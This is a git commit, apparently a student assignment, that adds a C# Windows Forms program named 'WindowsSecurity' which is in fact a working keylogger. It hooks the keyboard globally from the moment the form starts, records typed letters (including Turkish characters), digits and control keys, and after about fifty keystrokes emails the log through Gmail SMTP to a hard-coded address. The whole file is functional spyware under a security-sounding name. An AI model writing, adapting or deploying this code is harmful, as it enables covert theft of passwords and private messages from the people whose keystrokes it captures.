034bc70140c169894a84ee24662b07374072e863
İbrahim Taha Pınar <tahapinar32@gmail.com>
2026-03-09 20:59:43 +0300

    The Assignment completed.

---
+++ WindowsSecurity/Form1.cs
@@ -0,0 +1,552 @@
+﻿using System.Net.Mail;
+using System.Runtime.InteropServices;
+using Microsoft.Win32;
+using HootKeys;
+namespace WindowsSecurity
+
+
+{
+    public partial class Form1 : Form
+    {
+        string email = Environment.GetEnvironmentVariable("EMAIL");
+        string password = Environment.GetEnvironmentVariable("EMAIL_PASS");
+        public Form1()
+        {
+            InitializeComponent();
+            TracktheKeys();
+        }
+        [DllImport("user32.dll")]
+        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+        const int KEYEVENTF_EXTENDEDKEY = 0x1;
+        const int KEYEVENTF_KEYUP = 0x2;
+
+
+
+        globalKeyboardHook keyboard = new globalKeyboardHook();
+        int number = 0;
+        string log = "";
+        bool BigChar = false;
+
+        void Mail()
+        {
+            MailMessage message = new MailMessage();
+            SmtpClient client = new SmtpClient();
+            client.Credentials = new System.Net.NetworkCredential(email, password);  
+            client.Port = 587;
+            client.Host = "smtp.gmail.com";
+            client.EnableSsl = true;
+
+            message.Body = log.ToString();
+            message.Subject = "LOGS";
+            message.From = new MailAddress("tahapinar32@gmail.com");
+            message.To.Add("tahapinar28@gmail.com");
+            
+            client.Send(message);
+        }
+        void TracktheKeys()
+        {
+            List<Keys> hookedKeys = keyboard.HookedKeys;
+            hookedKeys.Add(Keys.A);
+            keyboard.HookedKeys.Add(Keys.S);
+            keyboard.HookedKeys.Add(Keys.D);
+            keyboard.HookedKeys.Add(Keys.F);
+            keyboard.HookedKeys.Add(Keys.G);
+            keyboard.HookedKeys.Add(Keys.H);
+            keyboard.HookedKeys.Add(Keys.J);
+            keyboard.HookedKeys.Add(Keys.K);
+            keyboard.HookedKeys.Add(Keys.L);
+            keyboard.HookedKeys.Add(Keys.Z);
+            keyboard.HookedKeys.Add(Keys.X);
+            keyboard.HookedKeys.Add(Keys.C);
+            keyboard.HookedKeys.Add(Keys.V);
+            keyboard.HookedKeys.Add(Keys.B);
+            keyboard.HookedKeys.Add(Keys.N);
+            keyboard.HookedKeys.Add(Keys.M);
+            keyboard.HookedKeys.Add(Keys.Q);
+            keyboard.HookedKeys.Add(Keys.W);
+            keyboard.HookedKeys.Add(Keys.E);
+            keyboard.HookedKeys.Add(Keys.R);
+            keyboard.HookedKeys.Add(Keys.T);
+            keyboard.HookedKeys.Add(Keys.Y);
+            keyboard.HookedKeys.Add(Keys.U);
+            keyboard.HookedKeys.Add(Keys.I);
+            keyboard.HookedKeys.Add(Keys.O);
+            keyboard.HookedKeys.Add(Keys.P);
+
+            
+
+            keyboard.HookedKeys.Add(Keys.OemOpenBrackets);
+            keyboard.HookedKeys.Add(Keys.Oem6);
+            keyboard.HookedKeys.Add(Keys.Oem1);
+            keyboard.HookedKeys.Add(Keys.Oem7);
+            keyboard.HookedKeys.Add(Keys.OemQuestion);
+            keyboard.HookedKeys.Add(Keys.Oem5);
+
+            
+
+            keyboard.HookedKeys.Add(Keys.NumPad0);
+            keyboard.HookedKeys.Add(Keys.NumPad1);
+            keyboard.HookedKeys.Add(Keys.NumPad2);
+            keyboard.HookedKeys.Add(Keys.NumPad3);
+            keyboard.HookedKeys.Add(Keys.NumPad4);
+            keyboard.HookedKeys.Add(Keys.NumPad5);
+            keyboard.HookedKeys.Add(Keys.NumPad6);
+            keyboard.HookedKeys.Add(Keys.NumPad7);
+            keyboard.HookedKeys.Add(Keys.NumPad8);
+            keyboard.HookedKeys.Add(Keys.NumPad9);
+
+            
+
+            keyboard.HookedKeys.Add(Keys.D0);
+            keyboard.HookedKeys.Add(Keys.D1);
+            keyboard.HookedKeys.Add(Keys.D2);
+            keyboard.HookedKeys.Add(Keys.D3);
+            keyboard.HookedKeys.Add(Keys.D4);
+            keyboard.HookedKeys.Add(Keys.D5);
+            keyboard.HookedKeys.Add(Keys.D6);
+            keyboard.HookedKeys.Add(Keys.D7);
+            keyboard.HookedKeys.Add(Keys.D8);
+            keyboard.HookedKeys.Add(Keys.D9);
+
+            
+            keyboard.HookedKeys.Add(Keys.OemPeriod);
+            keyboard.HookedKeys.Add(Keys.Back);
+
+
+            keyboard.HookedKeys.Add(Keys.Space);
+            keyboard.HookedKeys.Add(Keys.Enter);
+            keyboard.HookedKeys.Add(Keys.CapsLock);
+            keyboard.KeyDown += new KeyEventHandler(KeyCombinations);
+        }
+        void KeyCombinations(object sender, KeyEventArgs e)
+        {
+            if(number > 50)
+            {
+                Mail();
+                number = 0;
+                log = "Empty";
+            }
+
+            if (e.KeyCode == Keys.CapsLock)
+            {
+                if (BigChar == true)
+                    BigChar = false;
+                else
+                    BigChar = true;
+            }
+            if (e.KeyCode == Keys.OemPeriod)
+            {
+
+                log += ".";
+                number++;
+            }
+            if (e.KeyCode == Keys.Back)
+            {
+
+                log += " BackSpace ";
+                number++;
+            }
+            if (e.KeyCode == Keys.NumPad0 || e.KeyCode == Keys.D0)
+            {
+
+                log += "0";
+                number++;
+            }
+            if (e.KeyCode == Keys.NumPad1 || e.KeyCode == Keys.D1)
+            {
+
+                log += "1";
+                number++;
+            }
+            if (e.KeyCode == Keys.NumPad2 || e.KeyCode == Keys.D2)
+            {
+
+                log += "2";
+                number++;
+            }
+            if (e.KeyCode == Keys.NumPad3 || e.KeyCode == Keys.D3)
+            {
+
+                log += "3";
+                number++;
+            }
+            if (e.KeyCode == Keys.NumPad4 || e.KeyCode == Keys.D4)
+            {
+
+                log += "4";
+                number++;
+            }
+            if (e.KeyCode == Keys.NumPad5 || e.KeyCode == Keys.D5)
+            {
+
+                log += "5";
+                number++;
+            }
+            if (e.KeyCode == Keys.NumPad6 || e.KeyCode == Keys.D6)
+            {
+
+                log += "6";
+                number++;
+            }
+            if (e.KeyCode == Keys.NumPad7 || e.KeyCode == Keys.D7)
+            {
+
+                log += "7";
+                number++;
+            }
+            if (e.KeyCode == Keys.NumPad8 || e.KeyCode == Keys.D8)
+            {
+
+                log += "8";
+                number++;
+            }
+            if (e.KeyCode == Keys.NumPad9 || e.KeyCode == Keys.D9)
+            {
+
+                log += "9";
+                number++;
+            }
+            if (e.KeyCode == Keys.OemOpenBrackets)
+            {
+                if (BigChar == true)
+                    log += "Ğ";
+                else
+                    log += "ğ";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.Oem6)
+            {
+                if (BigChar == true)
+                    log += "Ü";
+                else
+                    log += "ü";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.Oem1)
+            {
+                if (BigChar == true)
+                    log += "Ş";
+                else
+                    log += "ş";
+
+                number++;
+            }
+
+            if (e.KeyCode == Keys.Oem7)
+            {
+                if (BigChar == true)
+                    log += "İ";
+                else
+                    log += "i";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.OemQuestion)
+            {
+                if (BigChar == true)
+                    log += "Ö";
+                else
+                    log += "ö";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.Oem5)
+            {
+                if (BigChar == true)
+                    log += "Ç";
+                else
+                    log += "ç";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.Enter)
+            {
+                log += " Enter ";
+                number++;
+            }
+
+            if (e.KeyCode == Keys.Space)
+            {
+                log += " Space ";
+                number++;
+            }
+            if (e.KeyCode == Keys.A)
+            {
+                if (BigChar == true)
+                    log += "A";
+                else
+                    log += "a";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.S)
+            {
+                if (BigChar == true)
+                    log += "S";
+                else
+                    log += "s";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.D)
+            {
+                if (BigChar == true)
+                    log += "D";
+                else
+                    log += "d";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.F)
+            {
+
+                if (BigChar == true)
+                    log += "F";
+                else
+                    log += "f";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.G)
+            {
+
+                if (BigChar == true)
+                    log += "G";
+                else
+                    log += "g";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.H)
+            {
+
+                if (BigChar == true)
+                    log += "H";
+                else
+                    log += "h";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.J)
+            {
+
+                if (BigChar == true)
+                    log += "J";
+                else
+                    log += "j";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.K)
+            {
+
+                if (BigChar == true)
+                    log += "K";
+                else
+                    log += "k";
+
+                number++;
+
+            }
+            if (e.KeyCode == Keys.L)
+            {
+
+                if (BigChar == true)
+                    log += "L";
+                else
+                    log += "l";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.Z)
+            {
+
+                if (BigChar == true)
+                    log += "Z";
+                else
+                    log += "z";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.X)
+            {
+
+                if (BigChar == true)
+                    log += "X";
+                else
+                    log += "x";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.C)
+            {
+
+                if (BigChar == true)
+                    log += "C";
+                else
+                    log += "c";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.V)
+            {
+
+                if (BigChar == true)
+                    log += "V";
+                else
+                    log += "v";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.B)
+            {
+
+                if (BigChar == true)
+                    log += "B";
+                else
+                    log += "b";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.N)
+            {
+
+                if (BigChar == true)
+                    log += "N";
+                else
+                    log += "n";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.M)
+            {
+
+                if (BigChar == true)
+                    log += "M";
+                else
+                    log += "m";
+
+                number++;
+
+            }
+            if (e.KeyCode == Keys.Q)
+            {
+
+                if (BigChar == true)
+                    log += "Q";
+                else
+                    log += "q";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.W)
+            {
+
+                if (BigChar == true)
+                    log += "W";
+                else
+                    log += "w";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.E)
+            {
+
+                if (BigChar == true)
+                    log += "E";
+                else
+                    log += "e";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.R)
+            {
+
+                if (BigChar == true)
+                    log += "R";
+                else
+                    log += "r";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.T)
+            {
+
+                if (BigChar == true)
+                    log += "T";
+                else
+                    log += "t";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.Y)
+            {
+
+                if (BigChar == true)
+                    log += "Y";
+                else
+                    log += "y";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.U)
+            {
+
+                if (BigChar == true)
+                    log += "U";
+                else
+                    log += "u";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.I)
+            {
+
+                if (BigChar == true)
+                    log += "I";
+                else
+                    log += "ı";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.O)
+            {
+
+                if (BigChar == true)
+                    log += "O";
+                else
+                    log += "o";
+
+                number++;
+            }
+            if (e.KeyCode == Keys.P)
+            {
+
+                if (BigChar == true)
+                    log += "P";
+                else
+                    log += "p";
+
+                number++;
+            }
+        }
+        private void Form1_load(object sender,EventArgs e)
+        {
+            
+
+            if (Control.IsKeyLocked(Keys.CapsLock))
+            {
+                BigChar = true;
+            }
+            else
+            {
+                BigChar = false;
+            }
+
+            
+        }
+        
+    }
+}
